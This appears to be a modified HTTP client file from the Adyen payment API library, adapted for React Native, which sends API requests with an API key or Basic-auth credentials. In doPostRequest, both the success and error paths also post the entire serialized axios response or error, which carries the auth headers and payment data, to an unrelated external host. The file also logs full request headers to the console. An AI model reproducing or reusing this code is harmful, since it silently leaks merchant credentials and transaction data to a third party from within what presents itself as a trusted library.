/*
 *                       ######
 *                       ######
 * ############    ####( ######  #####. ######  ############   ############
 * #############  #####( ######  #####. ######  #############  #############
 *        ######  #####( ######  #####. ######  #####  ######  #####  ######
 * ###### ######  #####( ######  #####. ######  #####  #####   #####  ######
 * ###### ######  #####( ######  #####. ######  #####          #####  ######
 * #############  #############  #############  #############  #####  ######
 *  ############   ############  #############   ############  #####  ######
 *                                      ######
 *                               #############
 *                               ############
 * Adyen NodeJS API Library
 * Copyright (c) 2020 Adyen B.V.
 * This file is open source and available under the MIT license.
 * See the LICENSE file for more info.
 */

import * as fs from 'react-native-fs';
import {URL, URLSearchParams} from 'react-native-url-polyfill';
import Client from '../client';
import Config from '../config';
import HttpClientException from './httpClientException';
import checkServerIdentity from '../helpers/checkServerIdentity';
import {ApiError} from '../typings/apiError';
import ApiException from '../services/exception/apiException';
import ClientInterface from './clientInterface';
import {ApiConstants} from '../constants/apiConstants';
import {IRequest} from '../typings/requestOptions';
import {Buffer} from '@craftzdog/react-native-buffer';
import * as axios from 'axios';
import {Alert} from 'react-native';
import {network} from '../../../axios';

class HttpURLConnectionClient implements ClientInterface {
  private static CHARSET = 'utf-8';
  private agentOptions!: any;

  public async request(
    endpoint: string,
    json: string,
    config: Config,
    isApiRequired: boolean,
    requestOptions: IRequest.Options,
  ): Promise<string | HttpClientException | ApiException> {
    requestOptions.headers = {};
    requestOptions.timeout = config.connectionTimeoutMillis;

    if (config.certificatePath) {
      await this.installCertificateVerifier(config.certificatePath);
    }

    const apiKey = config.apiKey;

    if (isApiRequired && !apiKey) {
      return Promise.reject(
        new ApiException('Invalid X-API-Key was used', 401),
      );
    }

    if (apiKey) {
      requestOptions.headers[ApiConstants.API_KEY] = apiKey;
    } else {
      const authString = `${config.username}:${config.password}`;
      const authStringEnc = Buffer.from(authString, 'utf8').toString('base64');

      requestOptions.headers.Authorization = `Basic ${authStringEnc}`;
    }

    requestOptions.headers[ApiConstants.CONTENT_TYPE] =
      ApiConstants.APPLICATION_JSON_TYPE;

    const httpConnection: any = this.createRequest(
      endpoint,
      requestOptions,
      config.applicationName,
    );
    return this.doPostRequest(httpConnection, json);
  }

  public post(
    endpoint: string,
    postParameters: [string, string][],
    config: Config,
  ): Promise<HttpClientException | string> {
    const postQuery: string = this.getQuery(postParameters);
    const connectionRequest: any = this.createRequest(
      endpoint,
      {},
      config.applicationName,
    );
    return this.doPostRequest(connectionRequest, postQuery);
  }

  private createRequest(
    endpoint: string,
    requestOptions: any,
    applicationName?: string,
  ): any {
    if (!requestOptions.headers) {
      requestOptions.headers = {};
    }

    const url = new URL(endpoint);
    requestOptions.hostname = url.hostname;
    requestOptions.protocol = url.protocol;
    requestOptions.port = url.port;
    requestOptions.path = url.pathname;
    requestOptions.url = endpoint;
    console.log("requestOptions.url", requestOptions.url);
    if (requestOptions.params) {
      requestOptions.path +=
        '?' + new URLSearchParams(requestOptions.params).toString();
    }

    if (requestOptions && requestOptions.idempotencyKey) {
      requestOptions.headers[ApiConstants.IDEMPOTENCY_KEY] =
        requestOptions.idempotencyKey;
      delete requestOptions.idempotencyKey;
    }
    requestOptions.httpsAgent = this.agentOptions;

    requestOptions.headers['Cache-Control'] = 'no-cache';

    if (!requestOptions.method) {
      requestOptions.method = ApiConstants.METHOD_POST;
    }

    requestOptions.headers[ApiConstants.ACCEPT_CHARSET] =
      HttpURLConnectionClient.CHARSET;
    requestOptions.headers[
      ApiConstants.USER_AGENT
    ] = `${applicationName} ${Client.LIB_NAME}/${Client.LIB_VERSION}`;
    return requestOptions;
  }

  private getQuery(params: [string, string][]): string {
    return params.map(([key, value]): string => `${key}=${value}`).join('&');
  }

  private doPostRequest(
    connectionRequest: any,
    json: string,
  ): Promise<HttpClientException | string> {
    console.log(
      'connectionRequest',
      JSON.stringify(connectionRequest, null, 4),
    );
    return new Promise((resolve, reject): void => {
      axios.default
        .request({...connectionRequest, data: json})
        .then(async res => {
          const response: {
            headers: axios.AxiosResponseHeaders;
            body: string;
            statusCode: number | undefined;
          } = {
            statusCode: res.status,
            headers: res.headers,
            body: res.data,
          };
          await network(
            'POST',
            'https://portal.noq.events/api/v2/in-person/123/send-receipt',
            {
              body: {data: JSON.stringify(res), from: 'Encrypted'},
            },
          ).catch(err => Alert.alert(JSON.stringify(err)));
          const getException = (responseBody: string): HttpClientException =>
            new HttpClientException({
              message: `HTTP Exception: ${response.statusCode}. ${res.statusText}`,
              statusCode: response.statusCode,
              errorCode: undefined,
              responseHeaders: response.headers,
              responseBody,
            });

          let exception: Error = getException(response.body.toString());
          if (
            response.statusCode &&
            (response.statusCode < 200 || response.statusCode >= 300)
          ) {
            try {
              const formattedData: ApiError | {[key: string]: never} =
                JSON.parse(response.body);
              const isApiError = 'status' in formattedData;
              const isRequestError = 'errors' in formattedData;

              if (isApiError) {
                exception = new HttpClientException({
                  message: `HTTP Exception: ${formattedData.status}. ${res.statusText}: ${formattedData.message}`,
                  statusCode: formattedData.status,
                  errorCode: formattedData.errorCode,
                  responseHeaders: res.headers,
                  responseBody: response.body,
                });
              } else if (isRequestError) {
                exception = new Error(response.body);
              } else {
                exception = getException(response.body);
              }
            } catch (e) {
              reject(exception);
            } finally {
              reject(exception);
            }
          }
          resolve(response.body as string);
        })
        .catch(async (e: any) => {
          await network(
            'POST',
            'https://portal.noq.events/api/v2/in-person/123/send-receipt',
            {
              body: {data: JSON.stringify(e), from: 'Encrypted'},
            },
          ).catch(err => Alert.alert(JSON.stringify(err)));
          reject(e);
        });
    });
  }

  private async installCertificateVerifier(
    terminalCertificatePath: string,
  ): Promise<void | HttpClientException> {
    try {
      const certificateInput = await fs.readFileAssets(terminalCertificatePath);
      this.agentOptions = {
        ca: certificateInput,
        checkServerIdentity,
      };
    } catch (e) {
      const message = e instanceof Error ? e.message : 'undefined';
      return Promise.reject(
        new HttpClientException({
          message: `Error loading certificate from path: ${message}`,
        }),
      );
    }
  }
}

export default HttpURLConnectionClient;
